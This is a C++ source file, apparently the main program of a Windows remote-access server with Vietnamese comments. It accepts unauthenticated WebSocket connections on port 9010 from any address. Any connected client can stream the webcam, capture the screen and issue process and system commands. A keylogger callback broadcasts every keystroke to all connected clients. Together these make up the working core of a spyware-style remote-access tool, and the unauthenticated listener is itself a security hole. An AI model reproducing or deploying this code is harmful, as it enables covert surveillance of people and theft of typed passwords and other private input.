#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <boost/beast/core.hpp>
#include <boost/beast/websocket.hpp>
#include <boost/asio/ip/tcp.hpp>
#include <iostream>
#include <string>
#include <thread>
#include <mutex>
#include <vector>
#include <algorithm>
#include <nlohmann/json.hpp>

// Include các module
#include "core/CommandDispatcher.hpp"
#include "interfaces/IRemoteModule.hpp"
#include "modules/KeyManager.hpp"
#include "modules/WebcamManager.hpp"
#include "modules/ScreenManager.hpp"  // Phải có file này (chứa hàm static capture_screen_data)
#include "modules/ProcessManager.hpp" // Module vừa tách file

namespace beast     = boost::beast;
namespace websocket = beast::websocket;
namespace net       = boost::asio;
using tcp           = net::ip::tcp;
using json          = nlohmann::json;

// ==================== GLOBALS ====================
static std::mutex cout_mtx;
KeyManager keyManager;
CommandDispatcher g_dispatcher;

class KeyManagerAdapter : public IRemoteModule {
public:
    const std::string& get_module_name() const override { 
        static const std::string name = "KEYBOARD"; return name; 
    }
    json handle_command(const json& request) override { return keyManager.handle_command(request); }
};

// ==================== SESSION MANAGER ====================
class SessionManager {
public:
    void join(websocket::stream<tcp::socket>* ws) {
        std::lock_guard<std::mutex> lock(mutex_);
        sessions_.push_back(ws);
    }
    void leave(websocket::stream<tcp::socket>* ws) {
        std::lock_guard<std::mutex> lock(mutex_);
        sessions_.erase(std::remove(sessions_.begin(), sessions_.end(), ws), sessions_.end());
    }
    void broadcast(const std::string& message) {
        std::lock_guard<std::mutex> lock(mutex_);
        for (auto* ws : sessions_) {
            try {
                ws->text(true);
                ws->write(net::buffer(message));
            } catch (...) {}
        }
    }
private:
    std::vector<websocket::stream<tcp::socket>*> sessions_;
    std::mutex mutex_;
};
static SessionManager g_sessionManager;

// ==================== SESSION LOOP ====================
void do_session(tcp::socket s) {
    auto ws = std::make_shared<websocket::stream<tcp::socket>>(std::move(s));
    
    // Mutex để đồng bộ hóa việc gửi dữ liệu (tránh tranh chấp giữa Main Thread và Webcam Thread)
    auto ws_mutex = std::make_shared<std::mutex>();

    try {
        // Log kết nối
        std::string client_ip = ws->next_layer().remote_endpoint().address().to_string();
        { std::lock_guard<std::mutex> lk(cout_mtx); std::cout << "[SESSION] CONNECTED: " << client_ip << "\n"; }

        ws->accept();
        g_sessionManager.join(ws.get());

        for (;;) {
            beast::flat_buffer buffer;
            ws->read(buffer); // Block chờ tin nhắn từ Client
            
            std::string req_str = beast::buffers_to_string(buffer.data());
            json request, response;
            bool response_sent_binary = false; // Cờ đánh dấu nếu đã gửi binary rồi

            try {
                request = json::parse(req_str);
                std::string module = request.value("module", "");
                std::string cmd = request.value("command", "");

                // --- 1. XỬ LÝ WEBCAM (STREAM) ---
                if (module == "WEBCAM") {
                    auto* cam = dynamic_cast<WebcamManager*>(g_dispatcher.get_module("WEBCAM"));
                    if (cam) {
                        if (cmd == "START_STREAM") {
                            std::cout << "[MAIN] Webcam Stream Started\n";
                            // Callback chạy trên thread riêng của WebcamManager
                            cam->start_stream([ws, ws_mutex](const std::vector<uint8_t>& data) {
                                std::lock_guard<std::mutex> lock(*ws_mutex);
                                try {
                                    if(ws->is_open()) {
                                        ws->binary(true); // Chế độ Binary
                                        ws->write(net::buffer(data.data(), data.size()));
                                    }
                                } catch (...) {}
                            });
                            response = {{"status", "success"}, {"message", "Stream Started"}};
                        } 
                        else if (cmd == "STOP_STREAM") {
                            cam->stop_stream();
                            response = {{"status", "success"}, {"message", "Stream Stopped"}};
                        }
                    }
                } 

                // --- 2. XỬ LÝ SCREENSHOT (BINARY MODE - TỐI ƯU) ---
                else if (module == "SCREEN" && cmd == "CAPTURE_BINARY") {
                    std::vector<uint8_t> jpg_data;
                    std::string err;
                    
                    // Gọi hàm static chụp ảnh JPEG (đã cài đặt ở ScreenManager_win.cpp)
                    if (ScreenManager::capture_screen_data(jpg_data, err)) {
                        {
                            std::lock_guard<std::mutex> lock(*ws_mutex);
                            ws->binary(true);
                            ws->write(net::buffer(jpg_data.data(), jpg_data.size()));
                        }
                        // Client nhận binary xong không cần JSON response chứa ảnh nữa
                        // Nhưng ta vẫn gửi JSON xác nhận lệnh đã xong (Client có thể ignore)
                        response = {{"module", "SCREEN"}, {"command", "CAPTURE_COMPLETE"}, {"status", "success"}};
                        response_sent_binary = true; 
                    } else {
                        response = {{"status", "error"}, {"message", err}};
                    }
                }

                // --- 3. CÁC LỆNH THƯỜNG (Process, App, System...) ---
                else {
                    response = g_dispatcher.dispatch(request);
                }

            } catch (const std::exception& e) {
                response = {{"status", "error"}, {"message", e.what()}};
            }

            // Gửi phản hồi JSON kết thúc lệnh (trừ khi cần thiết)
            {
                std::lock_guard<std::mutex> lock(*ws_mutex);
                ws->text(true); // Chuyển về Text mode
                ws->write(net::buffer(response.dump()));
            }
        }

    } catch (const std::exception& e) {
        { std::lock_guard<std::mutex> lk(cout_mtx); std::cerr << "[SESSION END] " << e.what() << "\n"; }
        
        // Stop webcam nếu client ngắt kết nối đột ngột
        if (auto* cam = dynamic_cast<WebcamManager*>(g_dispatcher.get_module("WEBCAM"))) {
            cam->stop_stream();
        }
    }

    g_sessionManager.leave(ws.get());
}

int main() {
    SetConsoleOutputCP(CP_UTF8);
    std::cout << "=== REMOTE SERVER (Binary Optimized) ===\n";

    // Đăng ký module
    g_dispatcher.register_module(std::make_unique<KeyManagerAdapter>());
    // ProcessManager giờ đã được đăng ký tự động trong constructor của CommandDispatcher 
    // (Nếu bạn sửa CommandDispatcher.hpp), hoặc đăng ký thủ công tại đây nếu muốn:
    // g_dispatcher.register_module(std::make_unique<ProcessManager>());

    // Callback cho Keylogger
    KeyManager::set_callback([&](std::string key_char) {
        json msg; 
        msg["module"] = "KEYBOARD"; 
        msg["command"] = "PRESS"; 
        msg["data"] = { {"key", key_char} };
        g_sessionManager.broadcast(msg.dump());
    });

    try {
        net::io_context ioc{1};
        tcp::acceptor acceptor{ioc, {net::ip::make_address("0.0.0.0"), 9010}};
        std::cout << "[SERVER] Listening on port 9010...\n";

        for (;;) {
            tcp::socket socket{ioc};
            acceptor.accept(socket);
            std::thread(do_session, std::move(socket)).detach();
        }
    } catch (const std::exception& e) {
        std::cerr << "[FATAL] " << e.what() << "\n";
    }
    return 0;
}